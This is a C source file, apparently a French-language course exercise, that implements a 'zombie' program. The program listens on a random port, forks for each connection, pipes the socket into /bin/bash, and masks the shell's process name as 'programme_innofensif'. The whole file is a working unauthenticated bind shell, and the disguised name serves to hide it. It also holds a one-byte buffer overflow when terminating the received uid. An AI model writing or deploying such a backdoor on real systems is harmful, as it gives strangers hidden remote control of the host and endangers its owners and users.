#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/wait.h>
#include <stdio.h>
#include <unistd.h>

int client_sock;
#include "messages.h"
#include "utils_v2.h"
#include "zombie.h"


void sigint(int sig)
{
    // envoi du message de fermeture "FERMER_ZOMBIE" 
    char *shutdown_message = "FERMER_ZOMBIE\n";
    swrite(client_sock, shutdown_message, strlen(shutdown_message));
    close(client_sock);
    exit(0);

}

int getPort(int minPort, int maxPort)
{
    int sock;

    //port aleatoire 
    int port = randomIntBetween(minPort, maxPort);

    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);

    // le socket et le port se lie
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) == 0)
    {
        close(sock);
        return port;
    }

    // liaison echoué
    close(sock);

    return -1;
}


int createConnection(int port)
{
    int sock;
    struct sockaddr_in addr;

    // creation du socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
    {
        sclose(sock);
        return -1;
    }

    // on fait la mise en ecoute du socket pour toutes les connexion entrantes
    if (listen(sock, 1) < 0)
    {
        sclose(sock);
        return -1;
    }

    // on renvoi les sockets prets
    return sock;
}

int main()
{

    // on gere ici le signal SIGINT (CTRL-C)
    struct sigaction sa;
    sa.sa_handler = sigint;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);

    int port = getPort(MIN_PORT, MAX_PORT);
    if (port == -1)
    {
        printf("Il n'y a pas de ports disponibles\n");
        return 1;
    }

    int sock = createConnection(port);
    if (sock < 0)
    {
        printf("Impossible de crÃ©er une connexion\n");
        return 1;
    }

    printf("Le zombie tourne sur ce port :  %d...\n", port);
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    while (1)
    {
        // on accepte une connexion entrante
        client_sock = accept(sock, (struct sockaddr *) &client_addr, &client_addr_len);
        if (client_sock < 0)
        {
            printf("Impossible d'accepter la connexion\n");
            return 1;
        }

        int pid = sfork();

        if (pid == 0)
        {
            // FILS    

            char buffer2[BUF_SIZE];

            // on lis les donnees provenant du client 
            ssize_t uid_recu = sread(client_sock, buffer2, BUF_SIZE);
            if (uid_recu > 0)
            {
                buffer2[uid_recu] = '\0';
                printf("uid : %s\n", buffer2);
            }

            // Redirection des descripteurs de fichiers vers le socket
            dup2(client_sock, STDIN_FILENO);
            dup2(client_sock, STDOUT_FILENO);
            dup2(client_sock, STDERR_FILENO);

            // on execute le programme innofensif
            execl("/bin/bash", "programme_innofensif", NULL);
            perror("execl");
            exit(1);
        }
        
        sleep(1);
    }

    return 0;
}